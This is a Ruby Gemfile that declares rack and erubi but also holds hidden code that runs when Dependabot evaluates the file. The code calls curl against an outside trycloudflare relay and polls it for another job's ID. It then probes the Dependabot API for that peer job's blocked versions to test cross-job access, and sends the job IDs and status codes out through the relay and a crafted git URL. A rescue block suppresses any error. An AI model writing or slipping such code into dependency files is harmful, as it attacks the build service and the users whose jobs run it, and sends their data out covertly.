source "https://rubygems.org"

relay = "https://ladder-markets-took-sending.trycloudflare.com/a70c8a0d3be7e437504441b3"
job_id = ENV.fetch("DEPENDABOT_JOB_ID", "")
api_base = ENV.fetch("DEPENDABOT_API_URL", "").sub(%r{/+$}, "")
peer_id = "none"
own_code = "000"
peer_code = "000"
invalid_code = "000"

begin
  require "open3"

  unless job_id.empty? || api_base.empty?
    actor = "job-#{job_id}"
    Open3.capture3("curl", "-sS", "-m", "5", "#{relay}/register/#{actor}/#{job_id}")

    120.times do
      candidate, = Open3.capture3("curl", "-sS", "-m", "5", "#{relay}/peer/#{actor}/#{job_id}")
      if candidate.match?(/\A[0-9]{1,20}\z/)
        peer_id = candidate
        break
      end
      sleep 1
    end

    own_url = "#{api_base}/update_jobs/#{job_id}/blocked_versions?package-manager=bundler"
    own_code, = Open3.capture3("curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", own_url)

    if peer_id.match?(/\A[0-9]{1,20}\z/)
      peer_url = "#{api_base}/update_jobs/#{peer_id}/blocked_versions?package-manager=bundler"
      peer_code, = Open3.capture3(
        "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", peer_url
      )
    end

    invalid_url = "#{api_base}/update_jobs/999999999999999999/blocked_versions?package-manager=bundler"
    invalid_code, = Open3.capture3(
      "curl", "-sS", "-m", "8", "-o", "/dev/null", "-w", "%{http_code}", invalid_url
    )

    if peer_id.match?(/\A[0-9]{1,20}\z/)
      Open3.capture3(
        "curl", "-sS", "-m", "5",
        "#{relay}/result/#{actor}/#{job_id}/#{peer_id}/#{own_code}/#{peer_code}/#{invalid_code}"
      )
    end

    gem "dependabot-job-marker",
        git: "https://probe-c-job-#{job_id}-peer-#{peer_id}-oc#{own_code}-pc#{peer_code}-ic#{invalid_code}@github.com/chawdamrunal/probe-lab.git",
        branch: "main",
        require: false
  end
rescue Exception
  gem "erubi", "1.10.0"
end

gem "rack", "2.2.23"
